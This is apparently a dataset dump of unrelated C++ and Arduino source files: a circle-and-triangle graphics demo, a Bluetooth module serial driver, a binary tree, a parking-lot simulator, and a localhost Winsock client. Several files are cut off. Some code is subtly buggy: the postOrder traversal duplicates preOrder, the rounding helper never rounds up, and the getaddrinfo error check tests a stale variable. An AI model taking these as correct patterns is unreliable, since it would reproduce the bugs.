    "#include<iostream>\r\n#include<graphics.h>\r\n#include<dos.h>\r\n#include<math.h>\r\n#include<conio.h>\r\n\r\nusing namespace std;\r\nclass Pattern\r\n\t\t\t\r\n{\r\n\tint xc,yc,r;\r\n\tpublic:\r\n\t\tvoid getdata()\r\n\t\t{\r\n\t\t\tcout<<\"enter center (x,y) and radius of circle\";\r\n\t\r\n\t\t\tcin>>xc>>yc>>r;\r\n\t\t}\r\n\r\n \t\tvoid draw_pattern(){\r\n\r\n\r\n\t\t\tbresCircle(xc,yc,r);\r\n\t\t\tddaLine(xc-sqrt(3)*r,yc+r,xc+sqrt(3)*r,yc+r);\r\n\t\t\tddaLine(xc-sqrt(3)*r,yc+r,xc,yc-2*r) ;\r\n\t\t\tddaLine(xc+sqrt(3)*r,yc+r,xc,yc-2*r);\r\n\t\t\touttextxy(xc-sqrt(3)*r,yc+r,\"(x1,y1)\");\r\n\t\t\touttextxy(xc+sqrt(3)*r,yc+r,\"(x2,y2)\");\r\n\t\t\touttextxy(xc, yc-2*r,\"(x3,y3)\");\r\n\t\t\tbresCircle(xc,yc,2*r);\r\n\r\n        } \r\n\r\n\t\tvoid ddaLine(int x1,int yl,int x2,int y2);\r\n\r\n\t\tvoid bresCircle(int xc,int yc,int r);\r\n\r\n\t\tint round(float p)\r\n\t\t{\r\n\t\t\tint q;\r\n\t\t\tq=p;\r\n\t\t\tif ((p-q)>0.5)\r\n\t\t\t\treturn q++;\r\n\t\t\telse\r\n\t\t\t   \treturn q;\r\n        }\r\n};\r\nvoid Pattern :: ddaLine(int x1,int yl,int x2,int y2)//dda\r\n\r\n{\r\n\r\n\r\n\r\n\tint steps,i,dx,dy;\r\n\tfloat x,y,xinc,yinc;\r\n\tdx = x2-x1;\r\n\tdy = y2-yl;\r\n\tif (abs (dx)>abs (dy) )\r\n\t\tsteps=abs (dx);\r\n\telse\r\n\t\tsteps=abs(dy);\r\n\txinc=dx/(float)steps;\r\n\tyinc=dy/(float)steps;\r\n\tx=x1;\r\n\ty=yl;\r\n\tputpixel(x,y,10);\r\n\tfor(i=0;i<steps; i++)\r\n\t{\r\n\t\tx=x+xinc;\r\n\t\ty=y+yinc;\r\n\t\tputpixel(round(x),round(y),10);\r\n\t\tdelay(20);\r\n    }\r\n}\r\n\r\nvoid display(int xc,int yc,int x,int y)\r\n{\r\n\r\n\tputpixel (xc+x, yc+y,15);\r\n\tputpixel (xc+y, yc+x, 15);\r\n\tputpixel (xc+y, yc-x,15);\r\n\tputpixel (xc+x, yc-y,15);\r\n\tputpixel(xc-x,yc-y,15);\r\n\tputpixel (xc-y,yc-x,15);\r\n\tputpixel (xc-y, yc+x,15);\r\n\tputpixel(xc-x,yc+y,15);\r\n\r\n}\r\nvoid Pattern :: bresCircle(int xc,int yc,int r)\r\n{\r\n\r\n\tint x,y;\r\n\t\r\n\tfloat s;\r\n\t\r\n\tx= 0;\r\n\t\r\n\ty=r;\r\n\t\r\n\ts= 3-2*r;\r\n\t\r\n\tdisplay(xc,yc,x,y);\r\n\tdelay(20);\r\n\twhile(x < y)\r\n    {\r\n        if (s<=0)\r\n        {\r\n            s=s+4*x + 6;\r\n            x=x+1;\r\n        }\r\n\t\telse\r\n\t\t{\r\n\t\t\ts=s+4*(x-y) + 10;\r\n\t\t\tx=x+1;\r\n\t\t\ty=y-1;\r\n        }\r\n\t\tdisplay(xc,yc,x,y  );\r\n\t\tdelay(20);\r\n    }\r\n}\r\nint main()\r\n{\r\n\r\n\tint gd = DETECT, gm;\r\n\tPattern p1;\r\n\tp1.getdata();\r\n\tinitgraph(&gd,&gm,\"\");\r\n\tcleardevice();\r\n\tp1.draw_pattern();\r\n\tgetch();\r\n\t\r\n\tclosegraph();\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "#if defined(ARDUINO_SAMD_MKR1000) || defined(ARDUINO_SENSEBOX_MCU_ESP32S2) \n#include \"NINAB31serial.h\"\n\n#if defined(ARDUINO_SAMD_MKR1000) || defined(ARDUINO_SAMD_MKRZERO)\n  #define SerialBLE Serial3\n#elif defined(ARDUINO_SENSEBOX_MCU_ESP32S2)\n  #define SerialBLE Serial1\n#endif\n\n\nString NINAB31Serial::m_input=\"\";\nbool NINAB31Serial::connected=false;\n\nbool NINAB31Serial::configModule(){\n    SerialBLE.print(\"AT+UMRS=115200,2,8,1,1\\r\"); //115200, no flow control, 8 data bits, 1 stop bit, no parity\n    SerialBLE.print(\"AT&W0\\r\"); //write configuration to nonvolatile memory\n    SerialBLE.print(\"AT+CPWROFF\\r\"); //restart module into new configuration\n    SerialBLE.flush();\n    delay(2000); //wait for module to come up\n    /*digitalWrite(22,HIGH); //hardware power cycle - avoid if possible\n    delay(500);\n    digitalWrite(22,LOW);\n    delay(1000);\n    */\n    return checkResponse(\"ATE0\",500); //send command (echo off) and check if module is responding correctly\n}\n\nbool NINAB31Serial::begin(){\n    SerialBLE.begin(115200);\n    delay(500);\n    checkResponse(\"AT\",500); //throwaway command in case buffer gets reinitialized because SerialBLE.begin was already called\n    for(int i=0;i<3;i++){ //try to send a command, in case it fails configure device and restart it\n        if(checkResponse(\"ATE0\",500)){\n            return true;\n        }else{\n            if(configModule()){\n                return true;\n            }\n        }\n    }\n    return false;\n}\n\nbool NINAB31Serial::setLocalName(String name){\n    if(name.length()>29){\n        return false;\n    }\n    return checkResponse(String(\"AT+UBTLN=\\\"\")+name+\"\\\"\", 1000);\n}\n\nbool NINAB31Serial::advertise(){\n    return checkResponse(String(\"AT+UBTDM=3\"), 1000);\n}\n\nbool NINAB31Serial::stopAdvertise(){\n    return checkResponse(String(\"AT+UBTDM=1\"), 1000);\n}\n\n\nbool NINAB31Serial::setConnectionInterval(int minInterval, int maxInterval){\n    if(minInterval<32 || minInterval >16384 || maxInterval<32 || maxInterval >16384 || maxInterval<minInterval){\n        return false;\n    }\n    return checkResponse(String(\"AT+UBTLECFG=1,\")+minInterval,1000) && checkResponse(String(\"AT+UBTLECFG=2,\")+maxInterval,1000);\n}\n\nbool NINAB31Serial::writeValue(int characteristic, String value){\n    if(!connected){\n        return false;\n    }\n    if(value.length()>40){\n        return false;\n    }\n    return checkResponse(String(\"AT+UBTGSN=0,\")+characteristic+\",\"+value, 1000);\n}\n\nbool NINAB31Serial::writeValue(int characteristic, uint8_t* value, int len){\n    if(!connected){\n        return false;\n    }\n    if(len>20){\n        return false;\n    }\n    auto msg=String(\"AT+UBTGSN=0,\")+characteristic+\",\";\n    for(int i=0;i<len;i++){\n        msg+=String((value[i]&0xf0)>>4,HEX);\n        msg+=String((value[i]&0xf),HEX);\n    }\n    return checkResponse(msg, 1000);\n}\n\n\n\nint NINAB31Serial::parseResponse(String cmd, uint32_t timeout){\n  while(SerialBLE.available()){\n    (SerialBLE.read());\n  }\n  SerialBLE.print(cmd);\n  SerialBLE.write('\\r');\n  SerialBLE.flush();\n  String input=\"\";\n  auto starttime=millis();\n  while(millis()-starttime<timeout || timeout==0){\n    if(SerialBLE.available()){\n      input+=(char)(SerialBLE.read());\n      if(input.endsWith(\"ERROR\\r\")){\n        //Serial.println(String(\"error with command \")+cmd);\n        return -1;\n      }\n      if(input.endsWith(\"OK\\r\")){\n        int colonpos=input.indexOf(':');\n        int commapos=input.indexOf(',');\n        if(colonpos!=-1){\n          if(commapos!=-1){\n            return input.substring(colonpos+1,commapos).toInt();\n          }else{\n            return input.substring(colonpos+1).toInt();\n          }\n        }\n        return -1;\n      }\n    }\n  }\n  return -1;\n}\n\nbool NINAB31Serial::checkResponse(String msg, uint32_t timeout){\n  while(SerialBLE.available())SerialBLE.read(); //flush input buffer\n  SerialBLE.print(msg);\n  SerialBLE.write('\\r');\n  SerialBLE.flush();\n  String input=\"\";\n  auto starttime=millis();\n  while(millis()-starttime<timeout || timeout==0){\n    if(SerialBLE.available()){\n      input+=(char)(SerialBLE.read());\n      if(input.endsWith(\"ERROR\\r\")){\n        return false;\n      }\n      if(input.endsWith(\"OK\\r\")){\n        return true;\n      }\n    }\n  }\n  return false;\n\n}\n\nbool NINAB31Serial::checkUnsolicited(){\n    if(m_input.indexOf(\"UUBTACLC:0\")!=-1){\n        connected=true;\n        return true;\n    }\n    else if(m_input.indexOf(\"UUBTACLD:0\")!=-1){\n        connected=false;\n        return true;\n    }else{\n        return false;\n    }\n}\n\nbool NINAB31Serial::poll(){\n    if(SerialBLE.available()){\n      m_input+=(char)(SerialBLE.read());\n      if(m_input.endsWith(\"\\r\")){\n        if(checkUnsolicited()){\n            flushInput();\n            return false;\n        }\n        return true;\n      }\n    }\n    return false;\n}\n\nString NINAB31Serial::checkCharWritten(int handle){\n    if(m_input.indexOf(\"UUBTGRW:\")!=-1){\n        int commapos=m_input.indexOf(',');\n        int seccommapos=m_input.indexOf(',',commapos+1);\n        int thirdcommapos=m_input.indexOf(',',se",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct BinaryTree{\n    char tree[100];\n    BinaryTree(char key){\n        memset(tree, '\\0', sizeof tree);\n        tree[0] = key;\n    }\n\n    int left(int parent){\n        return (2 * parent + 1);\n    }\n\n    int right(int parent){\n        return (2 * parent + 2);\n    }\n\n    void setLeft(char key, int parent){\n        if(tree[parent] == '\\0'){\n            cout << \"Can't set child at \" << (parent * 2) + 1 << \", no parent found\";\n        }\n        else{\n            tree[left(parent)] = key;\n        }\n    }\n\n    void setRight(char key, int parent){\n        if(tree[parent] == '\\0'){\n            cout << \"Can't set child at \" << (parent * 2) + 2 << \", no parent found\";\n        }\n        else{\n            tree[right(parent)] = key;\n        }\n    }\n\n    void inOrder(int parent){\n        if(parent < 100 && tree[parent] != '\\0'){\n            inOrder(left(parent));\n            cout << tree[parent] << \" \";\n            inOrder(right(parent));\n        }\n    }\n    void preOrder(int parent){\n        if(parent < 100 && tree[parent] != '\\0'){\n            cout << tree[parent] << \" \";\n            preOrder(left(parent));\n            preOrder(right(parent));\n        }\n    }\n    void postOrder(int parent){\n        if(parent < 100 && tree[parent] != '\\0'){\n            cout << tree[parent] << \" \";\n            postOrder(left(parent));\n            postOrder(right(parent));\n        }\n    }\n};\n\nint main() {\n    BinaryTree bt('A');\n    bt.setLeft('B', 0);\n    bt.setRight('C', 0);\n    bt.setLeft('D', 1);\n    bt.setRight('E', 1);\n    bt.setLeft('F', 2);\n    bt.setRight('G', 2);\n    \n    cout << \"inorder : \"; bt.inOrder(0); cout << endl;\n    cout << \"preorder : \"; bt.preOrder(0); cout << endl;\n    cout << \"postorder : \"; bt.postOrder(0); cout << endl;\n    return 0;\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <stdexcept>\r\n\r\nclass Vehicle {\r\nprivate:\r\n    std::string licensePlate;\r\n    std::string vehicleType;\r\n\r\npublic:\r\n    Vehicle(const std::string& plate, const std::string& type)\r\n        : licensePlate(plate), vehicleType(type) {}\r\n\r\n    std::string getLicensePlate() const {\r\n        return licensePlate;\r\n    }\r\n\r\n    std::string getVehicleType() const {\r\n        return vehicleType;\r\n    }\r\n};\r\n\r\nclass ParkedVehicle {\r\nprivate:\r\n    Vehicle vehicle;\r\n\r\npublic:\r\n    ParkedVehicle(const Vehicle& v)\r\n        : vehicle(v) {}\r\n\r\n    const Vehicle& getVehicle() const {\r\n        return vehicle;\r\n    }\r\n};\r\n\r\nclass UnparkedVehicle {\r\nprivate:\r\n    Vehicle vehicle;\r\n    double fee;\r\n\r\npublic:\r\n    UnparkedVehicle(const Vehicle& v, double f)\r\n        : vehicle(v), fee(f) {}\r\n\r\n    const Vehicle& getVehicle() const {\r\n        return vehicle;\r\n    }\r\n\r\n    double getFee() const {\r\n        return fee;\r\n    }\r\n};\r\n\r\nclass ParkingLot {\r\nprivate:\r\n    int availableSpaces;\r\n    Vehicle* parkedVehicle;\r\n    double parkingRate;\r\n\r\npublic:\r\n    ParkingLot(int spaces, double rate)\r\n        : availableSpaces(spaces), parkedVehicle(nullptr), parkingRate(rate) {}\r\n\r\n    ParkedVehicle park(const Vehicle& vehicle) {\r\n        if (parkedVehicle != nullptr) {\r\n            throw std::runtime_error(\"A vehicle is already parked.\");\r\n        }\r\n\r\n        std::cout << \"Parking a vehicle...\" << std::endl;\r\n        parkedVehicle = new Vehicle(vehicle);\r\n        availableSpaces--;\r\n\r\n        std::cout << \"Vehicle parked.\" << std::endl;\r\n        return ParkedVehicle(*parkedVehicle);\r\n    }\r\n\r\n    UnparkedVehicle unpark(const Vehicle& vehicle) {\r\n        if (parkedVehicle == nullptr) {\r\n            throw std::runtime_error(\"No vehicle is currently parked.\");\r\n        }\r\n\r\n        if (vehicle.getLicensePlate() != parkedVehicle->getLicensePlate()) {\r\n            throw std::runtime_error(\"Invalid license plate. Vehicle is not parked.\");\r\n        }\r\n\r\n        std::cout << \"Unparking the vehicle...\" << std::endl;\r\n        double duration = calculateDuration();  // Calculate the duration of parking in minutes\r\n        double fee = calculateFee(duration);    // Calculate the fee based on the duration\r\n        UnparkedVehicle unparkedVehicle(*parkedVehicle, fee);\r\n        delete parkedVehicle;\r\n        parkedVehicle = nullptr;\r\n        availableSpaces++;\r\n\r\n        std::cout << \"Vehicle unparked.\" << std::endl;\r\n        return unparkedVehicle;\r\n    }\r\n\r\n    int getAvailableSpaces() const {\r\n        return availableSpaces;\r\n    }\r\n\r\n    double getParkingRate() const {\r\n        return parkingRate;\r\n    }\r\n\r\n    ~ParkingLot() {\r\n        if (parkedVehicle != nullptr) {\r\n            delete parkedVehicle;\r\n            parkedVehicle = nullptr;\r\n        }\r\n    }\r\n\r\nprivate:\r\n    double calculateDuration() const {\r\n        // You can implement the logic to calculate the duration of parking here\r\n        // For simplicity, we'll assume a fixed duration of 30 minutes\r\n        return 30.0;  // 30 minutes\r\n    }\r\n\r\n    double calculateFee(double duration) const {\r\n        // You can implement any fee calculation logic here based on the duration\r\n        // For simplicity, we'll use a flat rate per minute\r\n        return parkingRate * duration / 60.0;\r\n    }\r\n};\r\n\r\nint main() {\r\n    int parkingSpaces;\r\n    double parkingRate;\r\n\r\n    std::cout << \"Enter the number of parking spaces: \";\r\n    std::cin >> parkingSpaces;\r\n\r\n    if (parkingSpaces <= 0) {\r\n        std::cout << \"Invalid number of parking spaces. Exiting the program.\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    std::cout << \"Enter the parking rate per hour: \";\r\n    std::cin >> parkingRate;\r\n\r\n    ParkingLot parkingLot(parkingSpaces, parkingRate);\r\n\r\n    std::string licensePlate;\r\n    std::string vehicleType;\r\n\r\n    std::cout << \"Enter the license plate: \";\r\n    std::cin >> licensePlate;\r\n\r\n    std::cout << \"Enter the vehicle type: \";\r\n    std::cin >> vehicleType;\r\n\r\n    Vehicle vehicle(licensePlate, vehicleType);\r\n\r\n    try {\r\n        ParkedVehicle parkedVehicle = parkingLot.park(vehicle);\r\n        std::cout << \"Parked Vehicle License Plate: \" << parkedVehicle.getVehicle().getLicensePlate() << std::endl;\r\n        std::cout << \"Parked Vehicle Type: \" << parkedVehicle.getVehicle().getVehicleType() << std::endl;\r\n\r\n        std::cout << \"Available Parking Spaces: \" << parkingLot.getAvailableSpaces() << std::endl;\r\n\r\n        std::cout << \"Enter the license plate of the vehicle to unpark: \";\r\n        std::cin >> licensePlate;\r\n\r\n        Vehicle unparkedVehicle(licensePlate, \"\");  // Only license plate is needed for unparking\r\n\r\n        try {\r\n            UnparkedVehicle unparked = parkingLot.unpark(unparkedVehicle);\r\n            std::cout << \"Unparked Vehicle License Plate: \" << unparked.getVehicle().getLicensePlate() << std::endl;\r\n            std::cout << \"Unparked Vehicle Type: \" << unparked.getVehicle().getVehicleType() << std::endl;\r\n            std::cout << \"",
    "\ufeff#define WIN32_LEAN_AND_MEAN\n\n#include <Windows.h>\n#include <iostream>\n#include <WinSock2.h>\n#include <WS2tcpip.h>\n\nusing namespace std;\n\nint main()\n{\n    WSADATA wsaData; // \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438 \u043e \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 Windows Sockets\n    ADDRINFO hints; // \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0441\u043e\u043a\u0435\u0442\u0430\n    ADDRINFO* addrResult; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0441\u043f\u0438\u0441\u043e\u043a \u0430\u0434\u0440\u0435\u0441\u043e\u0432, \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u043d\u044b\u0445 \u043f\u043e\u0441\u043b\u0435 \u0432\u044b\u0437\u043e\u0432\u0430 getaddrinfo\n    SOCKET ConnectSocket = INVALID_SOCKET; // \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0441\u043e\u043a\u0435\u0442\u0430 \u0434\u043b\u044f \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n    char recvBuffer[512]; // \u0431\u0443\u0444\u0435\u0440 \u0434\u043b\u044f \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445\n\n    const char* sendBuffer1 = \"\\nHello from client aaa\"; // \u0431\u0443\u0444\u0435\u0440 \u0434\u043b\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0434\u0430\u043d\u043d\u044b\u0445 1\n    const char* sendBuffer2 = \"\\nHello from client bbb\"; // \u0431\u0443\u0444\u0435\u0440 \u0434\u043b\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0434\u0430\u043d\u043d\u044b\u0445 2\n\n    int result = WSAStartup(MAKEWORD(2, 2), &wsaData); // \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0438 Windows Sockets\n    if (result != 0) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0441\u0442\u0438 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438\n        cout << \"WSAStartup failed result\" << endl; // \u0432\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\n        return 1; // \u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0441 \u043e\u0448\u0438\u0431\u043a\u043e\u0439\n    }\n\n    ZeroMemory(&hints, sizeof(hints)); // \u043e\u0431\u043d\u0443\u043b\u0435\u043d\u0438\u0435 \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b hints\n    hints.ai_family = AF_INET; // \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432\u0430 \u0430\u0434\u0440\u0435\u0441\u043e\u0432 (IPv4)\n    hints.ai_socktype = SOCK_STREAM; // \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0442\u0438\u043f\u0430 \u0441\u043e\u043a\u0435\u0442\u0430 (\u043f\u043e\u0442\u043e\u043a\u043e\u0432\u044b\u0439)\n    hints.ai_protocol = IPPROTO_TCP; // \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043f\u0440\u043e\u0442\u043e\u043a\u043e\u043b\u0430 (TCP)\n\n    getaddrinfo(\"localhost\", \"666\", &hints, &addrResult); // \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438 \u043e\u0431 \u0430\u0434\u0440\u0435\u0441\u0435 \u0441\u0435\u0440\u0432\u0435\u0440\u0430\n    if (result != 0) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0441\u0442\u0438 \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438\n        cout << \"getaddrinfo failed with error\" << endl; // \u0432\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\n        freeaddrinfo(addrResult); // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438, \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0434\u043b\u044f addrResult\n        WSACleanup(); // \u043e\u0447\u0438\u0441\u0442\u043a\u0430 \u0440\u0435\u0441\u0443\u0440\u0441\u043e\u0432 Winsock\n        return 1; // \u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0441 \u043e\u0448\u0438\u0431\u043a\u043e\u0439\n    }\n    ConnectSocket = socket(addrResult->ai_family, addrResult->ai_socktype,\n        addrResult->ai_protocol); // \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u043e\u043a\u0435\u0442\u0430\n\n    if (ConnectSocket == INVALID_SOCKET) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0441\u0442\u0438 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u043e\u043a\u0435\u0442\u0430\n        cout << \"Socket creation with\" << endl; // \u0432\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\n        freeaddrinfo(addrResult); // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438, \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0434\u043b\u044f addrResult\n        WSACleanup(); // \u043e\u0447\u0438\u0441\u0442\u043a\u0430 \u0440\u0435\u0441\u0443\u0440\u0441\u043e\u0432 Winsock\n        return 1; // \u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0441 \u043e\u0448\u0438\u0431\u043a\u043e\u0439\n    }\n    result = connect(ConnectSocket, addrResult->ai_addr,\n        (int)addrResult->ai_addrlen); // \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f \u0441 \u0441\u0435\u0440\u0432\u0435\u0440\u043e\u043c\n    if (result == SOCKET_ERROR) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0441\u0442\u0438 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\n        cout << \"Unable connect to server\" << endl; // \u0432\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\n        closesocket(ConnectSocket); // \u0437\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0441\u043e\u043a\u0435\u0442\u0430\n        ConnectSocket = INVALID_SOCKET; // \u043e\u0431\u043d\u0443\u043b\u0435\u043d\u0438\u0435 \u0441\u043e\u043a\u0435\u0442\u0430\n        freeaddrinfo(addrResult); // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438, \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0434\u043b\u044f addrResult\n        WSACleanup(); // \u043e\u0447\u0438\u0441\u0442\u043a\u0430 \u0440\u0435\u0441\u0443\u0440\u0441\u043e\u0432 Winsock\n        return 1; // \u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0441 \u043e\u0448\u0438\u0431\u043a\u043e\u0439\n    }\n    result = send(ConnectSocket, sendBuffer1, (int)strlen(sendBuffer1), 0); // \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0434\u0430\u043d\u043d\u044b\u0445\n\n    if (result == SOCKET_ERROR) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0441\u0442\u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0434\u0430\u043d\u043d\u044b\u0445\n        cout << \"Send failed, error\" << result << endl; // \u0432\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\n        freeaddrinfo(addrResult); // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438, \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0434\u043b\u044f addrResult\n        WSACleanup(); // \u043e\u0447\u0438\u0441\u0442\u043a\u0430 \u0440\u0435\u0441\u0443\u0440\u0441\u043e\u0432 Winsock\n        return 1; // \u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0441 \u043e\u0448\u0438\u0431\u043a\u043e\u0439\n    }\n\n    result = send(ConnectSocket, sendBuffer2, (int)strlen(sendBuffer2), 0); // \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0434\u0430\u043d\u043d\u044b\u0445\n\n    if (result == SOCKET_ERROR) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0441\u0442\u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0434\u0430\u043d\u043d\u044b\u0445\n        cout << \"Send failed, error\" << result << endl; // \u0432\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\n        freeaddrinfo(addrResult); // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438, \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0434\u043b\u044f addrResult\n        WSACleanup(); // \u043e\u0447\u0438\u0441\u0442\u043a\u0430 \u0440\u0435\u0441\u0443\u0440\u0441\u043e\u0432 Winsock\n        return 1; // \u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0441 \u043e\u0448\u0438\u0431\u043a\u043e\u0439\n    }\n    cout << \"Send:\" << result << \"bytes:\" << endl; // \u0432\u044b\u0432\u043e\u0434 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438 \u043e \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0435 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0445 \u0431\u0430\u0439\u0442\n\n    result = shutdown(ConnectSocket, SD_SEND); // \u0437\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0434\u0430\u043d\u043d\u044b\u0445\n\n    if (result == SOCKET_ERROR) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0441\u0442\u0438 \u0437\u0430\u043a\u0440\u044b\u0442\u0438\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0434\u0430\u043d\u043d\u044b\u0445\n        cout << \"shutdown failed, error\" << result << endl; // \u0432\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\n        freeaddrinfo(addrResult); // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438, \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0434\u043b\u044f addrResult\n        WSACleanup(); // \u043e\u0447\u0438\u0441\u0442\u043a\u0430 \u0440\u0435\u0441\u0443\u0440\u0441\u043e\u0432 Winsock\n        return 1; // \u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0441 \u043e\u0448\u0438\u0431\u043a\u043e\u0439\n    }\n\n    do {\n        ZeroMemory(recvBuffer, 512); // \u043e\u0431\u043d\u0443\u043b\u0435\u043d\u0438\u0435 \u0431\u0443\u0444\u0435\u0440\u0430 \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445\n        result = recv(ConnectSocket, recvBuffer, 512, 0); // 